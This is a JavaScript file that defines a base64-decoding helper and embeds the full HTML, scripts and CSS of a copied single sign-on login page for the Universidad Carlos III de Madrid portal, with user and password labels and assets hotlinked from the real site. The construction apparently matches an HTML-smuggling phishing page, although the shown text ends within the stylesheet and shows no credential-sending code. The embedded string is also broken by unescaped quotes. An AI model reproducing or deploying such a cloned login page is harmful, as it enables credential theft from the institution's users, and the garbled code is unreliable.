function atou(b64) {
	return decodeURIComponent(escape(atob(b64)));
}

var base64encoded = "<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"/>
        <script type="text/javascript" src="https://login.uc3m.es/themes/uc3m/js/jquery-1.7.1.min.js"></script>
<script type="text/javascript" src="https://login.uc3m.es/themes/uc3m/js/jquery-ui-1.8.12.custom.min.js"></script>
<script type="text/javascript">
    langs = ["es","en"];
        /***********************************************************************
         * Define tu lenguaje por defecto
         ***********************************************************************/
        default_lang = "es";
        /***********************************************************************
         * Traducciones de textos
         ***********************************************************************/
        textos = {
es: {"title_label":"adAS | Servicio de Single Sign-On","texto_titulo":"Identificación de usuario","texto_subtitulo":"Autenticación centralizada","login_ko_label":"Los datos introducidos no fueron correctos.","titulo_1col":"Identificación de usuario","titulo_3col":"otros medios de autenticación","separador":"ó","label_user":"Usuario","label_pass":"Contraseña","nota1":"Una vez que se haya autenticado no será necesario identificarse de nuevo para acceder a otros recursos.","nota2":"Para desconectarse, recomendamos que cierre su navegador (cerrando todas las ventanas).","nota3":"Al requerir un nivel de confianza específico es posible que no pueda utilizar todas las vías de autenticación.","copyright":"adAS es un producto desarrollado por PRiSE","texto_1col_multiple_id":"Seleccione su identidad","label_multiple_id":"Autenticar como","submit_ok":"Aceptar","submit_ko":"Cancelar","debug_info_title":"Información de debug","received_message_text":"Se ha recibido un mensaje con las siguientes características:","received_message_title":"Mensaje recibido","to_send_message_title":"Mensaje a enviar","to_send_message_text":"Se va a enviar un mensaje con las siguientes características:","get_parameters_title":"Parametros GET","post_parameters_title":"Parametros POST","form_message_title":"Información","form_message_subtitle":"Envío de mensaje","form_message_text":"Si no se envía el mensaje automáticamente, pulse en el botón de \"Aceptar\".","status_title":"Información","status_subtitle":"Sesión global","status_text1":"La aplicación identificada como","status_text2":"ha solicitado que se cierre su sesión","status_text3":"Actualmente dispone de una sesión activa en adAS por lo que debe cerrarla antes de dejar de usar este navegador.","status_text4":"También tiene sesiones abiertas en las siguientes aplicaciones:","status_text5":" ","status_text6":"Se ha cerrado correctamente su sesión global. Recuerde cerrar su navegador para garantizar el cierre de sesión en el resto de aplicaciones.","status_close_session":"Cerrar sesión","notlogout":"* No se podrá cerrar la sesión automáticamente en estas aplicaciones. Recomendamos que cierre el navegador antes de dejar de utilizar este ordenador.","status_close_session_text":"Cerrar sesión en todas las aplicaciones","wayf_button":"No soy de esta organización","remember_button":"He olvidado mi contraseña","more_info_button":"Más información","back_button":"Volver atrás","wayf_title":"¿De dónde eres?","wayf_button_close":"Cancelar","error_title":"¡Ups! El siguiente error ocurrió en el sistema:","error_callback_title":"Error fatal en las funciones de callback","error_callback_p1":"Ocurrió el error","error_callback_p2":" en el archivo que contiene las funciones de callback: ","PROTOCOL_ERROR":"Petición del protocolo incorrecta.","METADATA_ERROR":"El recurso que busca no está dado de alta en el sistema.","POLICY_ATTRIBUTES_ERROR":"El recurso al que desea acceder no tiene una configuración correcta.","LOGOUT_ERROR":"Ha ocurrido un error al hacer LogOut de la aplicación. Por su seguridad cierre el navegador si quiere salir de todas las aplicaciones en las que se haya autenticado.","AUTHR_ERROR":"Acceso no autorizado a la aplicación solicitada","error_text1":"Póngase en contacto con los administradores de su sistema para solventar este problema.","error_text2":"Pulse aquí para obtener información técnica acerca del error","error_text3":"La siguiente información puede ser de ayuda para los administradores de su sistema:","error_text4":"Mensaje de la excepción","error_text5":"Parámetros de la excepción","error_text6":"Traza de la excepción","theme_error_authr_title":"¡Atención! Acceso no autorizado a la aplicación solicitada","theme_error_authr_text":"No está autorizado para acceder a la aplicación","theme_error_authr_contact":"Póngase en contacto con el servicio de atención al usuario de su organización para solventar este problema.","error_httpauth":"No hay información suficiente para validar por Autenticación HTTP","error_appletauth":"No hay información suficiente para validar por Certificado digital","sml_x509_authn_label":"Certificado digital","x509_tls_module_confirm_msg":"Para poder autenticarse es necesario tener configurado un certificado válido en el navegador o tener introducida correctamente en el lector de certificados la tarjeta correspondiente. Pulse \"Continuar\" para seguir.","x509_tls_module_confirm_title":"Confirmación de autenticación por certificado digital","submit_confirm":"Aceptar","notify_info_title":"Notificaciones del sistema","notification_error":"Ocurrió un error al realizar la petición. Inténtelo de nuevo en unos instantes.","notification_consent_title":"Solicitud de consentimiento de envío de atributos","notification_consent_button_ok":"Doy mi consentimiento","notification_consent_button_ko":"No, gracias","es":"Español","en":"English"},
en: {"title_label":"adAS | Single Sign-On Service","texto_titulo":"User identification","texto_subtitulo":"Single Sign-On Service","login_ko_label":"Wrong user or password.","titulo_1col":"User identification","titulo_3col":"Other authentication methods","separador":"or","label_user":"User","label_pass":"Password","nota1":"Once authenticated, you won't be prompted again to provide your credentials to log into any other resource.","nota2":"To log out, you are advised to close your browser (closing all its open windows).","nota3":"As an specific level of assurance is required, some ways of authentication might not be available.","copyright":"adAS is developed by PRiSE","texto_1col_multiple_id":"Select your identity","label_multiple_id":"Login as","submit_ok":"Send","submit_ko":"Cancel","debug_info_title":"Debug information","received_message_text":"It has been received a message with the following features:","received_message_title":"Received message","to_send_message_title":"Message to send","to_send_message_text":"It will be sent a message with the following features:","get_parameters_title":"GET parameters","post_parameters_title":"POST parameters","form_message_title":"Information","form_message_subtitle":"Send Message","form_message_text":"If the message doesn't redirect automatically, push the \"Send\" button","status_title":"Information","status_subtitle":"Global session","status_text1":"The application identified as","status_text2":"has requested to close your session","status_text3":"Currently you have an open global session. You must close it before leaving this computer.","status_text4":"You also have open sessions with the following applications:","status_text5":" ","status_text6":"You have been successfully logged out of your global session. You are advised to close your browser to ensure proper logout of any other application.","status_close_session":"Close session","notlogout":"* It couldn't be possible to close your session automatically in this applications. In order to close them, close the browser before leaving this computer.","status_close_session_text":"Close session in all applications","wayf_button":"I'm not from this organization","remember_button":"Forgot your password?","more_info_button":"More information","back_button":"Back","wayf_title":"Where Are You From?","wayf_button_close":"Cancel","error_title":"Ups! The following error happened:","error_callback_title":"Fatal error in the callback functions","error_callback_p1":"The error:","error_callback_p2":"happened in the following callbacks file: ","PROTOCOL_ERROR":"Wrong protocol request.","METADATA_ERROR":"The requested resource is not set up in the system.","POLICY_ATTRIBUTES_ERROR":"The requested resource has a wrong configuration.","LOGOUT_ERROR":"An error happened doing Logout in the application. In order to close them, close the browser before leaving this computer.","AUTHR_ERROR":"Not authorized access to the application","error_text1":"Contact your system administrators to solve this problem.","error_text2":"Click here to get more technical information about this error","error_text3":"The following information could be helpful to your system administrators:","error_text4":"Exception message","error_text5":"Exception parameters","error_text6":"Excepción trace","theme_error_authr_title":"Warning! Access to the requested application not authorized","theme_error_authr_text":"You are not authorized to access the application","theme_error_authr_contact":"Please, contact the IT service of your organization in order to solve this problem.","error_httpauth":"There isn't enough information for doing the validation using HTTP Authentication","error_appletauth":"There isn't enough information for doing the validation using a digital certificate","sml_x509_authn_label":"Digital certificate","x509_tls_module_confirm_msg":"In order to authenticate with digital certificate you must have configured a valid certificate in your browser or to have the card properly inserted in the certificate reader. Please, click in \"Continue\" to continue.","x509_tls_module_confirm_title":"Confirm digital certificate authentication","submit_confirm":"Send","notify_info_title":"System notifications","notification_error":"An error happened doing the request. Try it again in a few moments.","notification_consent_title":"Request for consent to send the user's attributes","notification_consent_button_ok":"I give my consent","notification_consent_button_ko":"No, thanks","es":"Español","en":"English"}
        };
        //Definition of translation functions
        function translate_to(lang){
                        var array_texts = textos[lang];
            $.each(array_texts, function(i,e){
                if (i == "title_label") {
                    document.title = e;
                }
                else {
                    var elem = $("#"+i);
                    var text = elem.text();
                    if(text==""){
                        var val = elem.val();
                        if(val==""){
                            var html = elem.html();
                            if(html==""){
                                console.log("No pudo traducir "+i+":"+e);
                            }else{
                                elem.html(e);
                            }
                        }else{
                            elem.val(e);
                            if(elem[0]!=null && elem[0]!=undefined && elem[0].className == "ui-btn-hidden"){
                                var span = elem.parent().children()[0];
                                $(span).html(e);
                            }
                        }
                    }else{
                        elem.html(e);
                    }
                }
            });
            if(langs.length>1){
                $(langs).each(function(i,e){
                    var aux = $("#"+this);
                    if(e==lang){
                        aux.addClass("highlight_lang");
                    }else if(aux.hasClass("highlight_lang")){
                        aux.removeClass("highlight_lang");
                    }
                });
            }
            changePasswordLinks(lang);
        }
        function default_translation(lang){
            translate_to(lang);
        }

        function activate_translation(){
            var length_langs = langs.length;
            if(length_langs>1){
                var srt = "";
               var i=0;
                $(langs).each(function(){
                        srt += "<span id="+this+">";
                        srt += textos[this][this];
                        srt +="</span>";
                        if(i<length_langs-1){
                            srt +=" | ";
                        }

                    i++;
                });
                $("#langs").append(srt);
                $(langs).each(function(){
                    $("#"+this).click(function(){
                        translate_to(this.id);
                        if ($("#adAS_i18n_theme").length == 1) {
                            $("#adAS_i18n_theme").val(this.id);
                        }
                    });
                });
            }
            default_translation(window.default_lang);
        }

        function changePasswordLinks(lang){
            changeLangInURL("#remember_button", lang);
            changeLangInURL("#more_info_button", lang);
            changeLangInURL("#notify_url", lang);
            changeLangInURL(".pwd_change_button", lang);
        }

        function changeLangInURL(id,lang){
          var re=$(id);
          if(re.length>0){
            var href = re.attr("href");
            var urlstring = href;
            if(!$(window).hasClass("URL")){
                urlstring = changeIEURLParam(href,lang);
            }else{
                urlstring = changeURLParam(href,lang);
             }
            re.attr("href",urlstring);
        }
      }
      function changeURLParam(href, lang) {
        var res = href;
        var url = new URL(href);
        if (url.searchParams.has("_lang")) {
            if (url.searchParams.get("_lang") !== lang) {
                url.searchParams.set("_lang", lang);
            }
        } else {
            url.searchParams.append("_lang", lang);
        }
        res = url.toString();
        return res;
      }
      function changeIEURLParam(href, lang) {
        var res = href;
        if(href.indexOf('_lang=')>0){//replace _lang value
            res = res.replace(/(_lang=)(es|en|ca|gl)/,'$1' + lang );
        }else{ //Add new _lang
            res = href + (href.indexOf('?')>0 ? '&' : '?') + "_lang" + '=' + lang;
        }
        return res;
    }
</script>
<style type="text/css">
    html, body, address, blockquote, div, dl, form, h1, h2, h3, h4, h5, h6, ol, p, pre, table, ul, dd, dt, li, tbody, td, tfoot, th, thead, tr, button,   map, a, abbr, acronym, b, bdo, big, br, cite, code, dfn, em, i, img, kbd, q, samp, small, span, strong, sub, sup, tt, var, legend, fieldset {
        margin: 0;
        padding: 0;
    }
    body {
        background-color: #FFFFFF;
        font: 14px arial,helvetica,verdana,sans-serif;
        text-align: center;
        width: 100%;
    }
    img {
        border: 0;
    }
    #main {
        margin-left: auto;
        margin-right: auto;
        margin-top: -23px;
        text-align: left;
        width: 893px;
    }
    #adas_logo{
        margin: 20px auto -30px;
        padding-left: 52px;
        position: relative;
        width: 893px;
        z-index: 182;
    }
    #logo_img{
        height: auto;
        margin-top: 6px;
    }
    #debug{
        padding-top:40px;
    }
    #header {
        margin-bottom: 10px;
        margin-top: 10px;
        padding: 5px;
    }

    #blue_bar{
        background-color: #001d85;
        height: 30px;
        width:100%;
    }
    #content h1 {
        color:  #001d85;
        margin-left:70px;
        margin-top:50px;
        margin-right:70px;
        margin-bottom: 2px;
        padding-bottom: 5px;
        border-bottom: solid 1px #001d85;
        text-align:center;
    }
    #content h5 {
        margin-bottom: 0.4em;
        margin-left:70px;
        margin-right:70px;
        padding-top:5px;
        border-top: dotted 1px #001d85;
        color:#888;
        font-size:16px;
        text-align:center;
    }
    #content .bloque{
        margin-left:70px;
        margin-right:70px;
        margin-top:20px;
    }
    #content_debug{
        margin-top:30px;
    }
    #debug h2, #debug p {
        margin-bottom: 0.4em;
        line-height: 150%;
    }
    #debug h3 {
        border-top: 1px solid #E0E0E0;
        margin-bottom: 0.4em;
        margin-top: 1em;
        padding-top: 1em;
    }
    #f_blue_bar{
        background-color: #001d85;
        height: 10px;
        width:100%;
        margin-top:30px;
    }
    a {
        color: #001d85;
        text-decoration: none;
    }
    .notes_texts {
        display: none;
        margin-left: auto;
        margin-right: auto;
        margin-top: 10px;
        text-align: center;
        width: 740px;
    }
    .disabled_button{
        background: none repeat scroll 0 0 #DDDDDD;
        height: 62px;
        margin-top: -62px;
        opacity: 0.6;
        position: absolute;
        width: 92px;
        -ms-filter:"progid:DXImageTransform.Microsoft.Alpha(Opacity=60)";
        filter: alpha(opacity = 60);
        -moz-opacity:0.6;
        -khtml-opacity: 0.6;
        z-index: 140;
        cursor: default;
    }
    .disabled_login{
        background: none repeat scroll 0 0 #DDDDDD;
        height: 26px;
        margin-top: -46px;
        opacity: 0.6;
        position: absolute;
        width: 328px;
        -ms-filter:"progid:DXImageTransform.Microsoft.Alpha(Opacity=60)";
        filter: alpha(opacity = 60);
        -moz-opacity:0.6;
        -khtml-opacity: 0.6;
        z-index: 140;
        cursor: default;
    }
    .disabled_submit{
        opacity: 0.6;
        -ms-filter:"progid:DXImageTransform.Microsoft.Alpha(Opacity=60)";
        filter: alpha(opacity = 60);
        -moz-opacity:0.6;
        -khtml-opacity: 0.6;
        cursor: default;
    }
    #identificacion{
        width:100%;
    }
    #identificacion td{
        width:350px;
    }
    #par {
        border-right: dotted 1px #001d85;
        padding-right: 20px;
        width:350px;
    }
    #auten_delegadas{
        padding-left: 20px;
    }
    .footer {
        float: right;
        margin-top: -10px;
        text-align: center;
        width: 420px;
    }
    #copyright{
        color: #001d85;
        font-size: 9pt;
        margin-top: 30px;
    }
    h1 {
        color: #001d85;
        font-size: 24px;
    }
    h2 {
        color: #001d85;
        font-size: 15px;
        text-transform: uppercase;
        text-align: center;
    }
    h3 {
        color: #666;
        font-size: 13px;
    }
    .text-question, p {
        color: #555;
        font-size: 10pt;
        margin-bottom: .3em;
    }
    .text-field {
        border-radius: 7px;
        -moz-border-radius: 7px;
        -webkit-border-radius: 7px;
        -ms-border-radius: 7px;
        -khtml-border-radius: 7px;
        line-height: 20px;
        height: 20px;
        border: 1px solid #001d85;
        float: right;
        margin-right: 36px;
        margin-top: -45px;
        width: 200px;
    }
    .form-item {
        margin-bottom: 20px;
    }
    .form-col1{
        background: #001d85;
        background: -moz-linear-gradient(top, #001d85 50%, #001d85 100%);
        background: -webkit-gradient(linear, left top, left bottom, color-stop(50%,#001d85), color-stop(100%,#001d85)); /* Chrome,Safari4+ */
        background: -webkit-linear-gradient(top,  #001d85 50%,#001d85 100%); /* Chrome10+,Safari5.1+ */
        background: -o-linear-gradient(top,  #001d85 50%,#001d85 100%); /* Opera 11.10+ */
        background: -ms-linear-gradient(top,  #001d85 50%,#001d85 100%); /* IE10+ */
        background: linear-gradient(top,  #001d85 50%,#001d85 100%); /* W3C */
        filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#001d85', endColorstr='#001d85',GradientType=0 ); /* IE6-8 */
        border-radius: 7px;
        -moz-border-radius: 7px;
        -webkit-border-radius: 7px;
        -ms-border-radius: 7px;
        -khtml-border-radius: 7px;
        -moz-box-shadow:    3px 3px 0px 0px #ddd;
        -webkit-box-shadow: 3px 3px 0px 0px #ddd;
        box-shadow:         3px 3px 0px 0px #ddd;
        color:#fff;
        line-height: 22px;
        padding: 2px 2px 2px 10px;
        text-transform: uppercase;
        width:90%;
        -webkit-text-size-adjust: 100%;
    }
    .form-col2{
        margin-right: -11px;
        margin-top:20px;
    }
    #edit-name-wrapper, #edit-pass-wrapper{
        margin-top:0px;
    }
    #auten_delegadas{
        padding-top:10px;
    }
    #submit_ok, #status_close_session, .button_class{
        color:#fff;
        background: #001d85; /* Old browsers */
        background: -moz-linear-gradient(top, #001d85 50%, #001d85 100%);
        background: -webkit-gradient(linear, left top, left bottom, color-stop(50%,#001d85), color-stop(100%,#001d85)); /* Chrome,Safari4+ */
        background: -webkit-linear-gradient(top,  #001d85 50%,#001d85 100%); /* Chrome10+,Safari5.1+ */
        background: -o-linear-gradient(top,  #001d85 50%,#001d85 100%); /* Opera 11.10+ */
        background: -ms-linear-gradient(top,  #001d85 50%,#001d85 100%); /* IE10+ */
        background: linear-gradient(top,  #001d85 50%,#001d85 100%); /* W3C */
        filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#001d85', endColorstr='#001d85',GradientType=0 ); /* IE6-8 */
        line-height: 22px;
        text-transform: uppercase;
        padding:2px;
        text-align: center;
        font-size: 12px;
        border-radius: 7px;
        -moz-border-radius: 7px;
        -webkit-border-radius: 7px;
        -ms-border-radius: 7px;
        -khtml-border-radius: 7px;
        border: 1px solid #001d85;
        margin-top:20px;
    }
    .own-button{
        background: #001d85; /* Old browsers */
        background: -moz-linear-gradient(top, #001d85 50%, #001d85 100%);
        background: -webkit-gradient(linear, left top, left bottom, color-stop(50%,#001d85), color-stop(100%,#001d85)); /* Chrome,Safari4+ */
        background: -webkit-linear-gradient(top,  #001d85 50%,#001d85 100%); /* Chrome10+,Safari5.1+ */
        background: -o-linear-gradient(top,  #001d85 50%,#001d85 100%); /* Opera 11.10+ */
        background: -ms-linear-gradient(top,  #001d85 50%,#001d85 100%); /* IE10+ */
        background: linear-gradient(top,  #001d85 50%,#001d85 100%); /* W3C */
        filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#001d85', endColorstr='#001d85',GradientType=0 ); /* IE6-8 */
    }
    .button-cont{
        line-height: 22px;
        z-index: 101;
        text-transform: uppercase;
    }
    .button-icon {
        width: 85px;
        height: 56px;
        position: absolute;
        top: 0;
    }
    .button-text {
        text-transform: none;
        position: absolute;
        bottom: 0px;
        width: 85px;
        line-height: 14px;
        font-size: 12px;
    }
    .button-layout{
        text-align: center;
        /*background-image: -moz-linear-gradient(0% 65% 90deg, rgb(26, 112, 32), rgb(34, 148, 43));
        background-image: -webkit-gradient(linear, 0% 0%, 0% 68%, from(#001d85), to(#001d85));*/
        background: #001d85; /* Old browsers */
        background: -moz-linear-gradient(top, #001d85 50%, #001d85 100%);
        background: -webkit-gradient(linear, left top, left bottom, color-stop(50%,#001d85), color-stop(100%,#001d85)); /* Chrome,Safari4+ */
        /* IE9 SVG, needs conditional override of 'filter' to 'none' */
        background: -webkit-linear-gradient(top,  #001d85 50%,#001d85 100%); /* Chrome10+,Safari5.1+ */
        background: -o-linear-gradient(top,  #001d85 50%,#001d85 100%); /* Opera 11.10+ */
        background: -ms-linear-gradient(top,  #001d85 50%,#001d85 100%); /* IE10+ */
        background: linear-gradient(top,  #001d85 50%,#001d85 100%); /* W3C */
        filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#001d85', endColorstr='#001d85',GradientType=0 ); /* IE6-8 */
        width:85px;
        height: 13px;
        padding:2px;
        font-size: 12px;
        border-radius: 7px;
        -moz-border-radius: 7px;
        -webkit-border-radius: 7px;
        -ms-border-radius: 7px;
        -khtml-border-radius: 7px;
        border: 1px solid #001d85;
        color:#fff;
        vertical-align:bottom;
        padding-top:45px;
        position: relative;
    }
    #multiple_id .form-item{
        width:430px;
    }
    #multipleid_button{
        margin-top: 30px;
        position: absolute;
    }
    #edit-name-wrapper .form-col2 select{
        margin-right:43px;
        border: 4px solid #fff;
        height: 24px;
    }
    .login-box{
        display:block;
        *padding-top:0px;
        height: auto;
    }
    .wayf_button_cl{
        position:relative;
    }
    .remember_button_cl{
        margin-top: -10px;
        position:relative;
    }
    .more_info_button_cl a{
        font-size: 11px;
        color:#1A7020    }
    #userpass {
        margin-top:20px;
    }
    #userpass div{
        margin-bottom:20px;
    }
    #otherlogin {
        height: 170px;
        margin-left: auto;
        margin-right: auto;
        margin-top: 1em;
        overflow: hidden;
        text-align: center;
        width: 281px;
    }
    #holder {
        height: 150px;
        overflow: hidden;
        position: relative;
        text-align: center;
    }
    #holder li {
        float: left;
        list-style: none outside none;
        margin-bottom: 9%;
        margin-left: 8%;
        margin-right: 8%;
    }
    button {
        width: 160px;
        margin-bottom: 7px;
    }
    #number-links {
        text-align: right;
        margin-right: 16px;
        margin-top: 4px;
        color: #555;
    }
    #number-links .active {
        color: #555;
    }
    .error_msg {
        padding: 4px;
        margin-bottom: 0em;
    }
    .error_subtitle{
        margin-right:40px;
        margin-left:40px;
    }
    .list-slo-sps {
        color: #000;
        font-size: 10pt;
        line-height: 150%;
        margin-bottom: .3em;
        padding-left: 1em;
    }
    .list-slo-sps li {
        margin-bottom: .3em;
        list-style: none;
        text-decoration: none;
    }
    .sp-nologout {
        color: #AF1111;
    }
    #sp-logout-request {
        font-weight: bold;
        border-bottom: 1px solid #E0E0E0;
    }
    #notlogout {
        color: #001d85;
        display: none;
    }
    .highlight_lang{
        color: #fff;
        font-weight: bold;
    }
    #langs{
        float:right;
        margin-bottom:2px;
        color:#fff;
        cursor:pointer;
        margin-right: 20px;
        margin-top: 10px;
    }
    #wayf_button{
        text-align:center;
        font-size: 14px;
    }
    #remember_button{
        font-size: 11px;
        color:#424245    }
    #wayf_button_close, #wayf_button_close2{
        font-size: 14px;
        color: #001d85;
        cursor:pointer;
    }
    #wayf_button_close_div{
        position: absolute;
        text-align: right;
        width: 90%;
    }
    #wayf_button_close:hover {
        cursor: pointer;
    }
    #wayfholder{
        margin-top: 30px;
        margin-bottom: 20px;
        text-align:center;
        padding-left:10%;
        padding-right:10%;
    }
    #wayfholder ul{
        margin-bottom: 10px;
        text-align:center;
    }
    #wayfholder li{
        float: left;
        list-style: none outside none;
        margin-bottom: 5%;
        margin-left: 8%;
    }
    #wayfholder li .own-button {
        width: 390px;
    }
    #wayfotherlogin{
        text-align: center;
        background-color: #F7F4F0;
        padding:20px;
        position: absolute;
        margin: auto;
        left: 45%;
        top: 20%;
        margin-left: -200px;
        width: 500px;
        min-height: 300px;
        border: 1px solid #E0E0E0;
        border-radius: 7px;
        -moz-border-radius: 7px;
        -webkit-border-radius: 7px;
        -ms-border-radius: 7px;
        -khtml-border-radius: 7px;
        z-index: 999;
    }
    #background_wayf{
        background: #000000 no-repeat center center fixed;
        position: absolute;
        left: 0;
        top: 0;
        margin: 0;
        padding: 0;
        width: 100%;
        height: 100%;
        z-index: 990;
        filter:alpha(opacity=60); /*IE*/
        -moz-opacity:.60;/*Firef*/
        opacity:.60 /*Safari*/
    }
    /*
     * Error page
    */

    #tech_error_info{
        padding-left:20px;
        padding-bottom: 10px;
        border:solid 1px #C7C7C7;
    }
    .exception_trace{
        font-size: 12px;
        padding: 10px;
        margin: 0;
        background: #f0f0f0;
        border-left: 1px solid #ccc;
        border-bottom: 1px solid #ccc;
        line-height: 14px; /*--Height of each line of code--*/
        width: 700px;
        overflow: auto;
        overflow-Y: hidden;  /*--Hides vertical scroll created by IE--*/
    }
    .exception_params_list li{
        margin-bottom: .3em;
        margin-left:10px;
        text-decoration: none;
    }
    .exception_params_list{
        color: #454C50;
        font-size: 10pt;
        line-height: 150%;
        margin-bottom: .3em;
        padding-left: 1em;
    }
    .exception_subtitle{
        font-weight: bold;
        margin-top:20px;
        color: #001d85;
    }
    .exception_title{
        margin-top:20px;
    }
    #error_text2_button{
        margin-top:20px;
        margin-bottom:10px;
        font:13px arial,helvetica,verdana,sans-serif;
        text-align: center;
    }
    #footer_error{
        position:absolute;
    }

    #cream_bar{
        background-color: #F7F4F0;
        width:100%;
        height: 100px;
        border-top:2px solid #fff;
        border-bottom:2px solid #fff;
        z-index:2;
        position:relative;
        text-align:left;
        background: #F7F4F0; /* Old browsers */
        background: -moz-linear-gradient(left, #F7F4F0 0%, #fff 50%, #fff 50%, #F7F4F0 100%); /* FF3.6+ */
        background: -webkit-gradient(linear, left top, right top, color-stop(0%,#F7F4F0), color-stop(50%,#fff), color-stop(50%,#fff), color-stop(100%,#F7F4F0)); /* Chrome,Safari4+ */
        background: -webkit-linear-gradient(left, #F7F4F0 0%,#fff 50%,#fff 50%,#F7F4F0 100%); /* Chrome10+,Safari5.1+ */
        background: -o-linear-gradient(left, #F7F4F0 0%, #fff 50%, #fff 50%,#F7F4F0 100%); /* Opera 11.10+ */
        background: -ms-linear-gradient(left, #F7F4F0 0%, #fff 50%, #fff 50%,#F7F4F0 100%); /* IE10+ */
        background: linear-gradient(left, #F7F4F0 0%,#fff 50%, #fff 50%,#F7F4F0 100%); /* W3C */
        /*  filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#fff', endColorstr='#F7F4F0',GradientType=0 ); /* IE6-9 */
    }
    #content {
        background-image: url("https://login.uc3m.es/themes/uc3m/img/tab_login_top_no_shadow.png"), url("https://login.uc3m.es/themes/uc3m/img/tab_login_middle.png");
        background-position: 25px 0px, center 0;
        background-repeat: no-repeat, repeat-y;
        padding: 2px;
        min-height: 400px;
    }
    #content_bottom{
        background: url("https://login.uc3m.es/themes/uc3m/img/tab_login_bottom.png") no-repeat scroll center center rgba(0, 0, 0, 0);
        height:53px;
        margin-top:0px;
    }
    #content_middle{
        background: url("https://login.uc3m.es/themes/uc3m/img/tab_login_middle.png") repeat-y scroll center center rgba(0, 0, 0, 0);
        height: 10px;
        margin-top:0px;
        padding-top: 0px;
    }
    .texttoolong{
        overflow-x:auto;
        overflow-y: hidden;
    }



    @media all and (max-width: 810px) and (min-width: 771px){ //tope mínimo sin ajustes: 890px
        body { -webkit-text-size-adjust: 100%; }
        body{
            min-width:230px;
            height:auto;
        }

        div{
            height:auto;
        }

        body, #no_scroll {
            overflow-x:hidden;
            //position: fixed;
        }
        #main{
            width: 850px;
        }
        #content{
            width: 800px;
            background-position: 0px 0px, center 0px;
            padding-right: 500px;
        }

        #identificacion{
            margin-left: 0px;
        }

        #par {

            border-right: 1px dotted #22942B;
            padding-right: 15px;
            padding-left: 10px;

        }
        #auten_delegadas {
            padding-left: 15px;
        }
        #nota1, #nota2 {
            font-size: 10pt;
        }


        .form-col1{
            width: 280px;
        }
        .text-field{
            margin-right: 30px;
            width: 170px;
            height: 20px;
        }

        #content_bottom {
            margin-left: 0px;
        }

        #wayfotherlogin{
            min-height: 100px;
        }

        .exception_trace{
            width: 600px;
        }

    }

    @media all and (max-width: 770px) and (min-width: 681px){ //para 720px, 736px y 768px
        body { -webkit-text-size-adjust: 100%; }
        div{
            height:auto;
        }

        body, #no_scroll {
            overflow-x:hidden;
            //position: fixed;
        }
        #main{
            width: 800px;
        }
        #content{
            width: 720px;
            background-position: 0px 0px, center 0px;
            padding-right: 500px;
        }
        #langs{
            font-size: 13px;
        }


        #identificacion{
            margin-left: 0px;
        }

        #par {

            border-right: 1px dotted #22942B;
            padding-right: 35px;

        }
        #auten_delegadas {
            padding-left: 35px;
        }
        #nota1, #nota2 {
            font-size: 13px;
        }

       .form-col1{
            width: 280px;
            -webkit-text-size-adjust: 100%;
        }
        .text-field{
            margin-right: 12px;
            width: 170px;
            height: 20px;
        }

        #content_bottom {
            margin-left: 0px;
        }

        #wayfotherlogin{
            padding: 20px 0px;
            left: 300px;
            min-height: 100px;
        }


        #content .bloque {
            margin-left:40px;
            margin-right: 40px;
            max-width: 670px;
        }
        .exception_trace{
            width: 575px;
        }
        textarea{
            width: 480px;
            margin-left: -10px;
        }

    }

    @media all and (max-width: 680px) and (min-width: 621px){ //para 640px y 667px
        body { -webkit-text-size-adjust: 100%; }
        body{
            min-width:230px;
            height:auto;
        }
        div{
            height: auto;
        }
        body, #no_scroll {
            overflow-x:hidden;
            //position: fixed;
        }
        #main{
            width: 700px;
        }
        #content{
            background-image: url("https://login.uc3m.es/themes/uc3m/img/tab_login_top_no_shadow.png");
            width: 620px;
            background-position: 0px 0px, center 0px;
            padding-right: 500px;
        }
        #langs{
            font-size: 13px;
        }

        #identificacion{
            margin-left: 0px;
        }

        #par {
            border-right: none;
            padding-right: 0px;
            border-bottom: 1px dotted #22942B;
            padding-bottom: 0px;
            position: absolute;
            margin-left: 90px;
            margin-right: 90px;
        }
        #auten_delegadas {
            float: left;
            padding: 280px 0px 0px;
            margin-left: 90px;
            margin-right: 90px;
        }

        .notes_texts{
            width: 600px;
            margin-top: 20px;
        }
        #nota1, #nota2 {
            font-size: 13px;
        }

        #content_bottom {
            margin-left: -100px;
        }

        #wayfotherlogin{
            padding: 20px 0px;
            left: 255px;
            min-height: 100px;
        }

        #content .bloque {
            margin-left:40px;
            margin-right: 40px;
            max-width: 580px;
        }
        .exception_trace{
            width: 475px;
        }
        .form-col1{
            height: 22px;
            -webkit-text-size-adjust: 100%;
        }

        textarea{
            width: 420px;
            margin-left: -30px;
        }

    }


    @media all and (max-width: 620px){
        body { -webkit-text-size-adjust: 100%; }
        body{
            min-width:230px;
            height:auto;
        }
        div{
            height: auto;
        }
        body, #no_scroll {
            overflow-x:hidden;
            //position: fixed;
        }
        #main{
            width: 670px;
        }
        #content{
            background-image: url("https://login.uc3m.es/themes/uc3m/img/tab_login_top_no_shadow.png");
            width: 620px;
            background-position: 0px 0px, center 0px;
            padding-right: 500px;
        }
        #langs{
            font-size: 13px;
        }

        #identificacion{
            margin-left: 0px;
        }

        #par {
            border-right: none;
            padding-right: 0px;
            border-bottom: 1px dotted #22942B;
            padding-bottom: 0px;
            position: absolute;
            margin-left: 70px;
            margin-right: 70px;
        }
        #auten_delegadas {
            float: left;
            padding: 280px 0px 0px;
            margin-left: 70px;
            margin-right: 70px;
        }

        .notes_texts{
            width: 520px;
            margin-top: 20px;
        }
        #nota1, #nota2 {
            font-size: 13px;
        }

        #content_bottom {
            margin-left: -100px;
        }

        #wayfotherlogin{
            padding: 20px 0px;
            left: 255px;
            min-height: 100px;
        }

        #content .bloque {
            margin-left:40px;
            margin-right: 40px;
            max-width: 580px;
        }
        .exception_trace{
            width: 475px;
        }
        .form-col1{
            height: 22px;
            -webkit-text-size-adjust: 100%;
        }
        textarea{
            width: 380px;
            margin-left: -50px;
            font-size: 12px;
        }

    }

    @media all and (max-width: 570px){ //para 533px, 540 px y 568px

        div{
            height:auto;
	}
        body, #no_scroll {
            overflow-x:hidden;
            //position: fixed;
        }
        #main{
            width: 595px;
        }
        #content{
            width: 515px;
            background-position: 0px 0px, center 0px;
